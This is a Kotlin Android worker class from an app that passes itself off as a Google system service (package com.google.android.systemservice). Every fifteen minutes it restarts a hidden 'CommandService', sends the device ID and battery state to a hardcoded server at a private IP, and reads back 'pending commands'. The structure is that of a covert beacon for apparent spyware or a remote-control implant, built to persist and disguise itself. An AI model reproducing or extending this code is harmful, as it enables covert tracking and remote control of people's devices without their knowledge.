package com.google.android.systemservice.workers

import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.work.*
import com.google.android.systemservice.services.CommandService
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class CommandWorker(
    context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    companion object {
        private const val TAG = "SystemWorker"
        private const val HEARTBEAT_URL = "http://192.168.1.5:3000/api/heartbeat"
        
        fun schedule(context: Context) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val workRequest = PeriodicWorkRequestBuilder<CommandWorker>(
                15, TimeUnit.MINUTES,
                5, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .setBackoffCriteria(
                    BackoffPolicy.EXPONENTIAL,
                    WorkRequest.MIN_BACKOFF_MILLIS,
                    TimeUnit.MILLISECONDS
                )
                .addTag("command_worker")
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "system_command_worker",
                ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
            
            Log.d(TAG, "CommandWorker scheduled")
        }

        fun cancel(context: Context) {
            WorkManager.getInstance(context).cancelUniqueWork("system_command_worker")
        }
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    override suspend fun doWork(): Result {
        Log.d(TAG, "CommandWorker executing")
        
        return withContext(Dispatchers.IO) {
            try {
                // Ensure CommandService is running
                ensureServiceRunning()
                
                // Send heartbeat
                sendHeartbeat()
                
                Result.success()
            } catch (e: Exception) {
                Log.e(TAG, "Worker error: ${e.message}")
                return@withContext if (runAttemptCount < 3) {
                    Result.retry()
                } else {
                    Result.failure()
                }
            }
        }
    }

    private fun ensureServiceRunning() {
        try {
            val intent = Intent(applicationContext, CommandService::class.java)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(intent)
            } else {
                applicationContext.startService(intent)
            }
            Log.d(TAG, "CommandService started from worker")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start CommandService: ${e.message}")
        }
    }

    private fun sendHeartbeat() {
        try {
            val deviceId = android.provider.Settings.Secure.getString(
                applicationContext.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            )

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("timestamp", System.currentTimeMillis())
                put("battery", getBatteryLevel())
                put("is_charging", isCharging())
            }

            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url(HEARTBEAT_URL)
                .post(body)
                .build()

            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d(TAG, "Heartbeat sent successfully")
                    
                    // Check for pending commands in response
                    val responseBody = response.body?.string()
                    if (!responseBody.isNullOrEmpty()) {
                        handlePendingCommands(responseBody)
                    }
                } else {
                    Log.e(TAG, "Heartbeat failed: ${response.code}")
                }
                Unit  // Explicit return for use block
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error sending heartbeat: ${e.message}")
        }
    }

    private fun handlePendingCommands(responseBody: String) {
        try {
            val json = JSONObject(responseBody)
            val commands = json.optJSONArray("commands")
            
            if (commands != null && commands.length() > 0) {
                Log.d(TAG, "Received ${commands.length()} pending commands")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing pending commands: ${e.message}")
        }
    }

    private fun getBatteryLevel(): Int {
        return try {
            val batteryManager = applicationContext.getSystemService(Context.BATTERY_SERVICE) 
                as android.os.BatteryManager
            batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (e: Exception) {
            -1
        }
    }

    private fun isCharging(): Boolean {
        return try {
            val batteryManager = applicationContext.getSystemService(Context.BATTERY_SERVICE) 
                as android.os.BatteryManager
            batteryManager.isCharging
        } catch (e: Exception) {
            false
        }
    }
}
